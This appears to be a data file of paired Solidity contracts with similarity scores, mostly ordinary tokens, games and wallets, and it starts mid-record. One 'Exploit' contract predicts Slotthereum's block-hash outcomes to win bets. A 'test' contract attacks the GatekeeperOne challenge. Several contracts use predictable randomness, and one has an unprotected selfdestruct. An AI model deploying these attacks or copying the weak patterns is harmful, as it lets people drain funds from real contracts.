    aion.ScheduleCall.value(callCost)( block.timestamp + 10 minutes, address(this), 0, 200000, 1e9, data, true);
}

function myfucntion(uint256 number) public {
    
    myData = myData+1;
    scheduleMyfucntion(number);
} 

function getMyData() view public returns (uint256) {
    return myData;
}
function () public payable {}
}",0.5716718589679619,"contract KopexExchange is TokenHolder{



    uint256 public price = 1;

    StandardToken public tokenContract;



    constructor(uint256 _price, StandardToken _tokenContract) public {

        price = _price;

        tokenContract = _tokenContract;



    }



    function setPrice(uint256 newPrice) public onlyOwner {

        require(newPrice > 0, 'inv1id price');

        price = newPrice;

    }



    function() public payable {

        require(msg.value > 0, 'no eth received');

        exchangeToken(msg.sender);

    }



    

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a * b;

        assert(a == 0 || c / a == b);

        return c;

    }



    function exchangeToken(address _buyer) public payable {

        uint256 amount = mul(msg.value, price);

        tokenContract.transfer(_buyer, amount);

    }



}"
"contract NotStamp {   bytes32 public notId;   uint public notRarity;
    constructor(bytes32 _id, uint _rarity) public {
      notId = _id;
      notRarity = _rarity;   } 
    }",0.5905190897461433,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract Ballot {

    struct Prop {
        uint votes;
        bytes32 data;
        address[] validators;

    }

   mapping (bytes32 => Prop) props;
   function addProp(address [] validators, bytes32 data ) public returns(bytes32) {
       var pHash = keccak256(data);
       var newProp = props[pHash];
       newProp.data = data;
       newProp.validators = validators;

       return(pHash);

   }

   function getProp (bytes32 pHash) public constant returns (uint, bytes32, address[]){
       var newProp = props[pHash];
       return(newProp.votes, newProp.data, newProp.validators);
   }

   function voteTo(bytes32 pHash) public {
        var newProp = props[pHash];
        newProp.votes = newProp.votes+1;

   }
}",0.5574567993807892,"contract REALotteryWheel{
    
    uint16 public round_count = 0;
    bytes32 public last_hash;
    address public controller;
    
    mapping (uint16 => bytes32) public hashes;
    
    function REALotteryWheel() public {
        controller = msg.sender;
        last_hash = keccak256(block.number, now);    
    }
    
    function do_spin(bytes32 s) internal {
        round_count = round_count + 1;
        last_hash = keccak256(block.number,now,s);
        hashes[round_count] = last_hash;
    }

    function spin(bytes32 s) public { 
    	if(controller != msg.sender) revert();
    	do_spin(s);
    }

    function get_hash (uint16 i) constant returns (bytes32){
        return hashes[i];
    }
    
    function () payable {
        do_spin(bytes32(msg.value));
    }
    
}"
"contract People {

    Person[] public people;

    struct Person {
        bytes32 firstName;
        bytes32 lastName;
        uint age; 
    }

    function addPerson(bytes32 _firstName, bytes32 _lastName, uint _age) returns (bool success) {

        Person memory newPerson;
        newPerson.firstName = _firstName;
        newPerson.lastName = _lastName;
        newPerson.age = _age;

        people.push(newPerson);
        return true;

    }

    function getPeople() constant returns (bytes32[],bytes32[],uint[]) {

        uint length = people.length;

        bytes32[] memory firstNames = new bytes32[](length);
        bytes32[] memory lastNames = new bytes32[](length);
        uint[] memory ages = new uint[](length);

        for(uint i = 0; i < people.length; i++) {

            
            Person memory currentPerson;

            currentPerson = people[i];

            firstNames = currentPerson.firstName;
            lastNames = currentPerson.lastName;
            ages = currentPerson.age;
        }

        return (firstNames, lastNames, ages);

    }

}",0.5454356536490793,"contract Operations {

    function copyBytesNToBytes(bytes32 source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < 32; i++) {

            if (source[i] == 0)

                break;

            else {

                destination[pointer[0]]=source[i];

                pointer[0]++;

            }

        }

    }

    function copyBytesToBytes(bytes memory source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < source.length; i++) {

            if (source[i] == 0)

                break;

            destination[pointer[0]]=source[i];

            pointer[0]++;

        }

    }

    function uintToBytesN(uint v) internal pure returns (bytes32 ret) {

        if (v == 0) {

            ret = '0';

        }

        else {

            while (v > 0) {





                ret = bytes32(uint(ret) >> 8);

                ret |= bytes32(((v % 10) + 48) << (8 * 31));

                v /= 10;

            }

        }

        return ret;

    }

    function stringToBytes32(string memory str) internal pure returns(bytes32) {

        bytes32 bStrN;

        assembly {

            bStrN := mload(add(str, 32))

        }

        return(bStrN);

    }

}"
"contract WalletFactory {
    mapping(address => address[]) wallets;

    function newWallet(address _owner) payable public returns(address wallet) {
        wallet = (address)(new createWallet(msg.sender));
        wallets[msg.sender].push(wallet);
        wallet.transfer(msg.value);
    }
}",0.5631458133505314,"contract SendMeBeer {

    address payable myAddress = 0xE52497FCA47cA80F6eAa161A80c0FAd247DDb457;

    function () external payable {

        myAddress.transfer(msg.value);

    }

    function getAddress() public view returns(address) {

        return myAddress;

    }

}"
"contract TestAssemblyAndRevert {
    function test(address from, address to, uint256 value) public {
        
        address token = 0xedc2d4aca4f9b6a23904fbb0e513ea0668737643;

        
        assembly { 
            
            mstore(0, 0x23b872dd00000000000000000000000000000000000000000000000000000000)

            
            
            calldatacopy(4, 4, 96)

            
            let result := call(gas, token, 0, 0, 100, 0, 32)

            if eq(result, 1) {
                return(0, 0)
            }

            
        }

        revert(""TOKEN_TRANSFER_FROM_ERROR""); 
    }
}",0.5150489247648091,"contract TenToken is ERC20 { 



    string public symbol=""GDEM"";       

    string public name =""TEN Token"";



    uint8 public decimals=6;          

    address public walletOwner;



    constructor() public 

    {

        totalSupply = 10**9 * (10**6);  

        balances[msg.sender] = totalSupply;               

        walletOwner = msg.sender;

        

        

        emit Transfer(0x0000000000000000000000000000000000000000, walletOwner, totalSupply);

    }



    

    function() external payable {

        revert();

    }

}"
"contract Creation  {



    struct hero  {
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
        int winCount;
        int trophies;
        int lossCount;
    }
    hero[] public heroes; 


    struct enemy {  
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
    }

    int basiclife=50;

    enemy[] public enemies;

  mapping (uint => address) public herotoowner;
  mapping (address => uint) public  heroCount;

  mapping (uint => address) public monstertoowner;
  uint public monsterCount; 

    function createhero(string memory _name) payable public  { 
     require(heroCount[msg.sender] == 0);
       uint id= heroes.push(hero(_name,basiclife,1,0,20,0,0,0))-1; 
       herotoowner[id] = msg.sender;
       heroCount[msg.sender]++;

    }
     function enemyRage(int _herolvl) public  { 
       uint id=enemies.push(enemy(""Rage"",20*_herolvl,_herolvl,7*_herolvl,5*_herolvl))-1;
       monstertoowner[id] = msg.sender;
       monsterCount++;

    }

    function enemyDerpina(int _herolvl) public  { 
       uint id=enemies.push(enemy(""Derpina"",40*_herolvl,_herolvl,14*_herolvl,10*_herolvl))-1; 
       monstertoowner[id] = msg.sender;
       monsterCount++;

    }

       function getHerosByOwner(address owner) external view returns( uint ) { 
        uint result =3;
        for (uint i = 0; i < 3; i++) {
              if (herotoowner[i] == owner) {
                result = i;
                break;
          }
        }
        return result;
        }
        function getmonstersByOwner(address owner) external view returns( uint ) { 
        uint result =0;
        for (uint i = enemies.length ; i > 0 ; i--) {
              if (monstertoowner[i] == owner) {
                result = i;
                break;
          }
        }
        return result;
        }

        uint nonce=0;

   function randNum(int _num) private   returns(int) {  
    int randomnumber = int(keccak256(abi.encodePacked(now, msg.sender, nonce))) % _num;
    if (randomnumber <=0) {
        randomnumber=(-1)*randomnumber;
    }
    nonce++;
    return randomnumber;
    }  

    function attack_hero(uint _heroid, uint _monsterid, int _num  ) external  { 

      hero storage myhero = heroes[_heroid];
      enemy storage monster = enemies[_monsterid];
      int attackofhero=0;
      if(_num==0) { 
       attackofhero=randNum(myhero.attack);
      }
      monster.life=monster.life - attackofhero;

      int attackofmonster=randNum(monster.attack);
      myhero.life=myhero.life - attackofmonster;

      if (monster.life <= 0 && myhero.life >0) { 
        myhero.winCount++;
        myhero.xp+=monster.xp;

        if (randNum(100) > 50 ){ 
              myhero.trophies++;
          }


      }
      if (myhero.xp>=10+2*myhero.lvl){ 
          myhero.lvl++;
          myhero.xp=0; 
          myhero.life=basiclife*myhero.lvl;  
          myhero.attack=myhero.attack*myhero.lvl;
        }
      if (myhero.life <= 0 ) { 
          myhero.lossCount++; 

      } 




    }
    function resurrection(uint _heroid) public { 
         hero storage myhero = heroes[_heroid];
         myhero.life=basiclife*myhero.lvl;
     }



}",0.589397277695842,"contract EthereumPot is usingOraclize {

    address public owner;
    address[] public addresses;
    address public winnerAddress;
    
    uint[] public slots;
    uint minBetSize = 0.01 ether;
    uint public potSize = 0;
    uint public amountWon;
    uint public potTime = 300;
    uint public endTime = now + potTime;
    uint public totalBet = 0;
    uint public random_number;
    
    bool public locked = false;

    event debug(string msg);
    event debugInt(uint random);
    event potSizeChanged(
        uint _potSize
    );
    event winnerAnnounced(
        address winner,
        uint amount
    );
    event timeLeft(uint left);
    
    function EthereumPot() public {
        oraclize_setProof(proofType_Ledger); 
        owner = msg.sender;
    }
    
    
    
    
    
    function __callback(bytes32 _queryId, string _result, bytes _proof) oraclize_randomDS_proofVerify(_queryId, _result, _proof)
    {
        
        if(msg.sender != oraclize_cbAddress()) throw;
        
         
        random_number = uint(sha3(_result))%potSize + 1;
        
          
        winnerAddress = findWinner(random_number);
        
        
        amountWon = this.balance * 98 / 100 ;
        
        
        
        winnerAnnounced(winnerAddress, amountWon);
        if(winnerAddress.send(amountWon)) {
            
            if(owner.send(this.balance)) {
                openPot();
            }
            
            
        }
        
        
        
    }
    
    function update() internal{
        uint delay = 0; 
        bytes32 queryId = oraclize_newRandomDSQuery(delay, 10, 400000); 
        queryId = queryId;
    }
    
    function findWinner(uint random) constant returns (address winner) {
        
        for(uint i = 0; i < slots.length; i++) {
            
           if(random <= slots[i]) {
               return addresses[i];
           }
            
        }    
        
    }
    
    function joinPot() public payable {
        
        if(now > endTime) throw;
        if(locked) throw;
        
        uint tickets = 0;
        
        for(uint i = msg.value; i >= minBetSize; i-= minBetSize) {
            tickets++;
        }
        if(tickets > 0) {
            addresses.push(msg.sender);
            slots.push(potSize += tickets);
            totalBet+= tickets;
            potSizeChanged(potSize);
            timeLeft(endTime - now);
        }
    }
    
    function getPlayers() constant public returns(address[]) {
        return addresses;
    }
    
    function getSlots() constant public returns(uint[]) {
        return slots;
    }

    function getEndTime() constant public returns (uint) {
        return endTime;
    }
    
    function openPot() internal {
        potSize = 0;
        endTime = now + potTime;
        timeLeft(endTime - now);
        delete slots;
        delete addresses;
        
        locked = false;
    }
    
    function rewardWinner() public payable {
        
        
        if(now < endTime) throw;
        if(locked) throw;
        locked = true;
        
        if(potSize > 0) {
            
            if(addresses.length == 1) {
                endTime = now + potTime;
                timeLeft(endTime - now);
                locked = false;
            }
                
            else {
             update();
            }
            
        }
        else {
            winnerAnnounced(0x0000000000000000000000000000000000000000, 0);
            openPot();
        }
        
    }
    

        

}"
"contract PromoContract {
      uint256 public promoCreatedCount;

      function createPromoPerson(address _owner, string _name, uint256 _price) public onlyCOO {
        require(promoCreatedCount < 5000);

        address personOwner = _owner;
        if (personOwner == address(0)) {
          personOwner = cooAddress;
        }

        if (_price <= 0) {
          _price = startingPrice;
        }

        promoCreatedCount++;
        _createPerson(_name, personOwner, _price);
      }
}",0.5693611665797679,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract PasswordTimeLock {
    uint timelock;
    bytes32 hashlock;
    address owner;
    string data = ""hello world"";

    function PasswordTimeLock(string _password) public {
        owner = msg.sender;
        hashlock = keccak256(owner, _password);
    }

    function unlock(string _password) public returns (bool) {
        require(keccak256(owner, _password) == hashlock);
        timelock = now + 20 seconds;
        return true;
    }

    function read() public view returns (string) {
        require(now < timelock);
        return data;
    }
}",0.5867167179891086,"contract ProvaSegura {

    struct Prova {
		bool existe;
        uint block_number;
    }

    mapping(address => Prova) public provas;
	address public owner;

    function ProvaSegura() public {
		owner = msg.sender;
    }

    function GuardaProva(address hash_) public {
        require(msg.sender == owner);
		require(!provas[hash_].existe);
		provas[hash_].existe = true;
		provas[hash_].block_number = block.number;
    }

    function ConsultaProva(address hash_) public constant returns (uint ret) {
        ret = provas[hash_].block_number;
    }
}"
"contract EmailServer {
  address owner;
  bytes[] inbox;

  function EmailServer() {
    owner = msg.sender;
  }

  function addEmail(bytes x) constant {
    inbox.push(x);
  }

  function getInboxCount() returns (uint count) {
    return inbox.length;
  }

  function getEmails() returns (bytes email) {
    bytes emailsOutput;
    uint inboxCount = getInboxCount();
    uint emailLength;

    if (inboxCount == 0) {
      throw;
    }

    emailsOutput.push('[');
    for (uint i = 0; i < inboxCount; i++) {
      emailLength = inbox[i].length;
      emailsOutput.push('""');
      for (uint j = 0; j < emailLength; j++) {
        emailsOutput.push(inbox[i][j]);
      }
      emailsOutput.push('""');

      if (i < inboxCount - 1) {
        emailsOutput.push(',');
      }
    }
    emailsOutput.push(']');

    return emailsOutput;
  }

  function getOwner() returns (address) {
    return owner;
  }

  
  function kill() {
    if (msg.sender == owner) {
      suicide(owner);
    }
  }
}",0.5998488053706867,"contract Exploit {
    address owner;
    uint8 pointer;
    Slotthereum target;
    
    function Exploit() {
        owner = msg.sender;
    }
    
    function attack(address a, uint8 n) payable {
        Slotthereum target = Slotthereum(a);
        pointer = n;
        uint8 win = getNumber(getBlockHash(pointer));
        target.placeBet.value(msg.value)(win, win);
    }
    
    function () payable {
        
    }
    
    function withdraw() {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
    
    function getBlockHash(uint i) internal constant returns (bytes32 blockHash) {
        if (i >= 255) {
            i = 255;
        }
        if (i <= 0) {
            i = 1;
        }
        blockHash = block.blockhash(block.number - i);
    }
    
    function getNumber(bytes32 _a) internal constant returns (uint8) {
        uint8 mint = pointer;
        for (uint i = 31; i >= 1; i--) {
            if ((uint8(_a[i]) >= 48) && (uint8(_a[i]) <= 57)) {
                return uint8(_a[i]) - 48;
            }
        }
        return mint;
    }
}"
"contract Oursurance {
    address public creator;
    uint x;

    function() payable { x = 1; }

    function Oursurance() payable {
        creator = msg.sender;
    }

    function reject() payable {
        selfdestruct(creator);
    }

    function send(address target, uint256 amount) payable {
        if (!target.send(amount)) throw;
    }

    function destroy(address target) payable {
        selfdestruct(0x0000000000000000000000000000000000000000);
    }
}",0.5977933505865285,"contract IYaoDun {



    function _transfer(address _from, address _to, uint256 _value) internal;

    function mintToken(address target, uint256 mintedAmount) public;

    function freezeAccount(address target, bool freeze) public;

    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) public;

    function buy() payable public;

    function sell(uint256 amount) public;

}"
"contract BidChain is AuctionHouse {

struct biddingData {
    uint endTime;
    uint highestBid;
    address bidder;
    bool initialized;
    mapping (address => bool) flaggedUsers;
}

mapping (uint => biddingData) itemToBiddingMap;

event newBidPlaced(uint itemId, uint bidAmount, address bidder);


function initiateBid(uint _itemId, uint _endTime) public {
    
    require(msg.sender == itemToOwnerMapping[_itemId]);
    itemToBiddingMap[_itemId] = biddingData(_endTime, 0, msg.sender, 
 true);
}
function initiateBid(uint _itemId, uint _endTime) public {
    
    require(msg.sender == itemToOwnerMapping[_itemId]);
    itemToBiddingMap[_itemId] = biddingData(_endTime, 0, msg.sender, true);
}


function flagUser(uint _itemId, address _flaggedUser) public {
    
    require(msg.sender == itemToOwnerMapping[_itemId]);
    require(itemToBiddingMap[_itemId].initialized == true);
    itemToBiddingMap[_itemId].flaggedUsers[_flaggedUser] = true;
}

function placeBid(uint _itemId) public payable {
    require(now < itemToBiddingMap[_itemId].endTime);
    require(msg.value > itemToBiddingMap[_itemId].highestBid);

    returnBidAmount(itemToBiddingMap[_itemId].bidder, itemToBiddingMap[_itemId].highestBid);

    itemToBiddingMap[_itemId].highestBid = msg.value;
    itemToBiddingMap[_itemId].bidder = msg.sender;

    emit newBidPlaced(_itemId, msg.value, msg.sender);
}

function returnBidAmount(address _sendee, uint _amount) internal {
    _sendee.transfer(_amount);
}


function transferItem(uint _itemId, address _newOwner) public {
    
    require(msg.sender == itemToOwnerMapping[_itemId]);
    require(now > itemToBiddingMap[_itemId].endTime);

    itemToOwnerMapping[_itemId] = _newOwner;
    ownerToItemCount[_newOwner]++;
    ownerToItemCount[msg.sender]--;

    msg.sender.transfer(itemToBiddingMap[_itemId].highestBid);
}


modifier itemOwner(uint _itemId) {
    require(msg.sender == itemToOwnerMapping[_itemId]);
    _;
   }
}",0.5586284977084927,"contract Fog {

  address public owner;



  event OwnershipTransferred(

    address indexed owner,

    address indexed newOwner

  );



  event Winner(address indexed to, uint indexed value);

  event CupCake(address indexed to, uint indexed value);

  event Looser(address indexed from, uint indexed value);



  constructor() public {

    owner = msg.sender;

  }



  function move(uint256 direction) public payable {

    require(tx.origin == msg.sender);



    uint doubleValue = mul(msg.value, 2);

    uint minValue = 10000000000000000; 



    

    require(msg.value >= minValue && doubleValue <= address(this).balance);



    

    uint dice = uint(keccak256(abi.encodePacked(now + uint(msg.sender) + direction))) % 3;



    

    if (dice == 2) {

      msg.sender.transfer(doubleValue);

      emit Winner(msg.sender, doubleValue);



    

    } else {

      

      uint coin = uint(keccak256(abi.encodePacked(now + uint(msg.sender) + direction))) % 2;



      

      if (coin == 1) {

        

        uint eightyPercent = div(mul(msg.value, 80), 100);



        msg.sender.transfer(eightyPercent);

        emit CupCake(msg.sender, eightyPercent);



      

      } else {

        emit Looser(msg.sender, msg.value);

      }

    }

  }



  function drain(uint value) public onlyOwner {

    require(value > 0 && value < address(this).balance);

    owner.transfer(value);

  }



  function transferOwnership(address newOwner) public onlyOwner {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  function() public payable { }



  

  function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {

    

    

    

    if (_a == 0) {

      return 0;

    }



    uint256 c = _a * _b;

    require(c / _a == _b);



    return c;

  }



  

  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    require(b > 0); 

    uint256 c = a / b;

    



    return c;

  }

}"
"contract Betting {

    struct Bet {
        uint betId;
        uint campaignId;
        address sender;
        uint stake;
        bool betValue;
    }

    struct BetCampaign {
        uint campaignId;
        Bet[] bets;
        mapping(address => bool) userReserved; 
        uint betEndTime;
        bool isEnded;
    }

    event BetCampaignCreated(uint campaignId, uint betEndTime);
    event BetAdded(uint betId, uint campaignId, address indexed user, uint256 betAmount, bool betsTrue);

    BetCampaign[] public betCampaigns;
    mapping(uint => bool)  betCampaignReserved;
    mapping(uint => bool) betReserved;
    uint nonce;

    constructor() public {
        nonce = 0;
    }

    modifier isLater(uint time) {
        require(time > now, ""The end time must be in the future"");
        _;
    }

    modifier campaignExistsM(uint campaignId) {
        require(campaignExists(campaignId), ""The campaign does not exist"");
        _;
    }

    modifier userNotInCampaign(uint campaignId, address user) {
        require(!betPlaced(campaignId, user));
        _;
    }

    modifier userInCampaign(uint campaignId, address user) {
        require(betPlaced(campaignId, user));
        _;
    }

    modifier isSelf(address target) {
        require(msg.sender == target);
        _;
    }

    modifier enoughMoney(uint amount) {
        require(msg.value >= amount);
        _;
    }

    function generateId() internal returns (uint) {
        nonce += 1;
        return uint(keccak256(abi.encodePacked(nonce)));
    }

    function campaignExists(uint campaignId) internal view returns (bool) {
        return betCampaignReserved[campaignId];
    }

    function createCampaign(uint betEndTime) public isLater(betEndTime) {
        while (true) {
            uint id = generateId();
            if (!campaignExists(id)) {
                BetCampaign memory newCampaign = BetCampaign(id, new Bet[](0), betEndTime, false);
                betCampaigns.push(newCampaign);
                betCampaignReserved[id] = true;
                emit BetCampaignCreated(id, betEndTime);
                break;
            }
        }
    }

    function getCampaignInformation(uint campaignId) public view campaignExistsM(campaignId) returns (uint, uint, bool) {
        BetCampaign memory campaign;
        for (uint i = 0; i < betCampaigns.length; i++) {
            if (betCampaigns[i].campaignId == campaignId) {
                campaign = betCampaigns[i];
                break;
            }
        }
        return (campaign.campaignId, campaign.betEndTime, campaign.isEnded);
    }

    function getCampaign(uint campaignId) internal view campaignExistsM(campaignId) returns (BetCampaign storage) {
        uint index = 0;
        for (uint i = 0; i < betCampaigns.length; i++) {
            if (betCampaigns[i].campaignId == campaignId) {
                index = i;
                break;
            }
        }
        BetCampaign storage campaign = betCampaigns[index];
        return campaign;
    }

    function betExists(uint betId) internal view returns (bool) {
        return betReserved[betId];
    }

    function addBet(uint campaignId, address sender, uint stake, bool betValue)
    payable public isSelf(sender) enoughMoney(stake) campaignExistsM(campaignId) userNotInCampaign(campaignId, sender) {
        while (true) {
            uint id = generateId();
            if (!betExists(id)) {
                BetCampaign storage campaign = getCampaign(campaignId);
                campaign.bets.push(Bet(id, campaignId, sender, stake, betValue));
                campaign.userReserved[sender] = true;
                emit BetAdded(id, campaignId, sender, stake, betValue);
                break;
            }
        }
    }

    function getBet(uint campaignId, address sender)
    public view campaignExistsM(campaignId) userInCampaign(campaignId, sender) returns (uint, uint, address, uint, bool) {
        Bet memory bet;
        BetCampaign memory campaign = getCampaign(campaignId);
        for (uint i = 0; i < campaign.bets.length; i++) {
            if (campaign.bets[i].sender == sender) {
                bet = campaign.bets[i];
            }
        }
        return (bet.betId, bet.campaignId, bet.sender, bet.stake, bet.betValue);
    }

    function betPlaced(uint campaignId, address sender) public view campaignExistsM(campaignId) returns (bool) {
        BetCampaign storage campaign = getCampaign(campaignId);
        return campaign.userReserved[sender];
    }

}",0.5788219860918061,"contract MultiSigWallet {



    

    event TransactionCreated(uint indexed _txId, uint indexed _timestamp, address indexed _creator);

    event TranscationSended(uint indexed _txId, uint indexed _timestamp);

    event TranscationSigned(uint indexed _txId, uint indexed _timestamp, address indexed _signer);

    event TranscationUnsigned(uint indexed _txId, uint indexed _timestamp, address indexed _signer);

    event Deposit(uint _amount, address indexed _sender);

    

    

    struct Transcation {

        address to;

        address tokenAddress; 

        uint amount;

        uint confirmations;

        bool done;

        mapping (address => bool) confirmed;

    }



    

    address[] public signers;

    

    

    uint public requiredConfirmations;

    

    

    uint public txCount;

    

    

    mapping (uint => Transcation) public transactions; 

    mapping (address => bool) isSigner; 



    

    string public name;

    



    modifier onlySigners {

        require(isSigner[msg.sender], ""msg.sender is not Signer"");

        _;

    } 



    

   

    constructor(

        address[] _signers, 

        uint _requiredConfirmations,

        string _name

    ) 

    public {

        require( 

            _requiredConfirmations <= _signers.length && 

            _requiredConfirmations > 0,

            ""required confirmations must be > 0 and less than number of signers""

        );

        requiredConfirmations = _requiredConfirmations;

        for (uint i = 0; i < _signers.length; i++) {

            signers.push(_signers[i]);

            isSigner[_signers[i]] = true;

        }

        name = _name;

    }



   

    function() public payable {

        require(msg.value > 0, ""value must be > 0"");

        emit Deposit(msg.value, msg.sender);

    }

    

    function getSigners() public view returns (address[]) {

        return signers;

    }



   

    function createTransaction(

        address _to, 

        address _tokenAddress,

        uint _amount

    ) 

    public 

    onlySigners {

        txCount++;

        transactions[txCount] = Transcation(

            _to,

            _tokenAddress,

            _amount,

            0,

            false

        );

        emit TransactionCreated(txCount, now, msg.sender);

        signTransaction(txCount);

    }



   

    function signTransaction(uint _txId) public  onlySigners {

        require(!transactions[_txId].confirmed[msg.sender] && _txId <= txCount, ""must be a valid unsigned tx"");

        transactions[_txId].confirmed[msg.sender] = true;

        transactions[_txId].confirmations++;

        emit TranscationSigned(_txId, now, msg.sender);

        if (transactions[_txId].confirmations >= requiredConfirmations) {

            _sendTransaction(_txId);

      }

    }

    

    function getTransactionsId(

        bool _pending, 

        bool _done,

        bool _tokenTransfers,

        bool _etherTransfers, 

        uint _tailSize

    ) 

    public 

    view returns(uint[] _txIdList) {

        uint[] memory tempList = new uint[](txCount);

        uint count = 0;

        uint id = txCount;

        while(id > 0 && count < _tailSize) {

            if ((_pending && !transactions[id].done || _done && transactions[id].done) && 

                (_tokenTransfers && transactions[id].tokenAddress != address(0) || 

                 _etherTransfers && transactions[id].tokenAddress == address(0))

                ) 

                {

                tempList[count] = id;

                count++;

                }

            id--;

        }

        _txIdList = new uint[](count);

        for (uint i = 0; i < count; i++) {

            _txIdList[i] = tempList[i];

        }

    }



    

    function isSigned(uint _txId, address _signer) 

        public

        view

        returns (bool _isSigned) 

    {

        _isSigned = transactions[_txId].confirmed[_signer];

    }

    

    function unsignTransaction(uint _txId) external onlySigners {

        require(

            transactions[_txId].confirmed[msg.sender] && 

            !transactions[_txId].done,

            ""must be a valid signed tx""

        );

        transactions[_txId].confirmed[msg.sender] = false;

        transactions[_txId].confirmations--;

        emit TranscationUnsigned(_txId, now, msg.sender);

    }



    

    function _sendTransaction(uint _txId) private {

        require(!transactions[_txId].done, ""transaction must not be done"");

        transactions[_txId].done = true;

        if ( transactions[_txId].tokenAddress == address(0)) {

            transactions[_txId].to.transfer(transactions[_txId].amount);

        } else {

            ERC20 token = ERC20(transactions[_txId].tokenAddress);

            require(token.transfer(transactions[_txId].to, transactions[_txId].amount), ""token transfer failded"");

        }

        emit TranscationSended(_txId, now);

    }



}"
"contract Manager {
    address[] contracts;

    constructor() { ... }

    function createNewContract(...) {
        C c = new C(...);
        contracts.push(address(c));
    }
}",0.5957048538394336,"contract Context {
	
	
	constructor() internal {}
	

	function _msgSender() internal view returns (address) {
		return msg.sender;
	}
}"
"contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}",0.5201606460770762,"contract VariableSupplyToken is ERC20x {

    function grant(address to, uint256 amount) public returns (bool) {

        require(msg.sender == creator);

        require(balances[to] + amount >= amount);

        balances[to] += amount;

        totalSupply += amount;

        return true;

    }



    function burn(address from, uint amount) public returns (bool) {

        require(msg.sender == creator);

        require(balances[from] >= amount);

        balances[from] -= amount;

        totalSupply -= amount;

        return true;

    }

}"
"contract test{
GatekeeperOne public t;
function test()public payable{
    t = GatekeeperOne(0x5c3c1540dfcd795b0aca58a496e3c30fe2405b07);

}
function attack()public payable{
    t.call.gas(41171)(bytes4(keccak256(""good(bytes8)"")), 0x123);
}
function attack2()public payable{
    t.enter(0x123);
}
function()public payable{}

}",0.5014925860328463,"contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}"
"contract Caller {
     uint public testVar = 88;
     uint public myVariable = 6;

     function delegatecallExample(address _contract, uint newVar) public {
         _contract.delegatecall(bytes4(keccak256(""updateMyVariable(uint256)"")), newVar);
     }

}",0.5585939442562315,"contract CryptoMiningWarInterface {

	uint256 public roundNumber;

    uint256 public deadline; 

    function addCrystal( address , uint256  ) public pure {}

    function isMiningWarContract() external pure returns(bool) {}

}"
"contract CalledContract {
    uint public myVariable = 5;

    function updateMyVariable(uint newVar) public payable {
        myVariable = newVar;
    }

}",0.5907107157971446,"contract PreIcoContract {
    function buyTokens (address _investor) public payable;
    uint256 public startTime;
    uint256 public endTime;
}"
"contract DinoFighter {

uint cooldownTime = 30 seconds;

struct Dino {
    string name;
    string color;
    uint readyTime;
    uint level;
    string status;
}

Dino[] public dinos;
mapping (uint => address) public dinoToOwner;

 modifier onlyOwner(uint _dinoId) {
     require(dinoToOwner[_dinoId] == msg.sender);
     _;
 }

function createDino(string _name, string _color) public {
    uint id = dinos.push(Dino(""Velonica"", ""Brown"", (now + cooldownTime), 0, ""none"")) - 1;
    dinoToOwner[id] = msg.sender;
}

function fightDino(uint _dinoId, uint _targetId) public onlyOwner(_dinoId) returns (string) {
    Dino storage myDino = dinos[_dinoId];
    Dino storage tDino = dinos[_targetId];
    if (uint((keccak256(now)) % 100) > 40) {
        myDino.level++;
        myDino.status = ""king"";
        tDino.readyTime = now + cooldownTime;
        tDino.status = ""loser"";
        return ""Winner"";
    } 
    else {
        tDino.level++;
        tDino.status = ""king"";
        myDino.readyTime = now + cooldownTime;
        myDino.status = ""loser"";
        return ""Loser"";
    }


}
}",0.5599365088446362,"contract ZperPreSale {

	uint256 public totalContributed;
	uint256 public startTime;
	uint256 public endTime;
	uint256 public hardCap;
	address public owner;

	event Transfer(address indexed _from, address indexed _to, uint256 _value);

	function ZperPreSale (address _owner, uint256 _start, uint256 _end, uint256 _cap) public {
		owner = _owner;
		startTime = _start;
		endTime = _end;
		hardCap = _cap * (10 ** 18);
	}

	function () external payable {
		require(now >= startTime && now <= endTime);
		require(hardCap >= msg.value + totalContributed);
		totalContributed += msg.value;
	}

	modifier onlyOwner() {
		assert(msg.sender == owner);
		_;
	}

	function showContributed() public constant returns (uint256 total) {
		return totalContributed;
	}

	function forwardFunds(address _to, uint256 _value) onlyOwner public returns (bool success) {
		require(_to != address(0));
		_to.transfer(_value);
		Transfer(address(0), _to, _value);
		return true;
	}

}"
"contract Election {

struct Candidate {
    string name;
    uint voteCount;
}
struct Voter {
    uint voteIndex;
    bool voted;
    uint weight;
}

address public owner;
string public name;
mapping(address => Voter) public voters;
Candidate[] public candidates;
uint public auctionEnd;

event ElectionResult(string name, uint voteCount);

function Election(string _name, uint durationMinutes, string candidate1, string candidate2, string candidate3, string candidate4, string candidate5) public{
    owner = msg.sender;
    name = _name; 
    auctionEnd = now + (durationMinutes * 1 minutes);

    candidates.push(Candidate(candidate1, 0));
    candidates.push(Candidate(candidate2, 0));
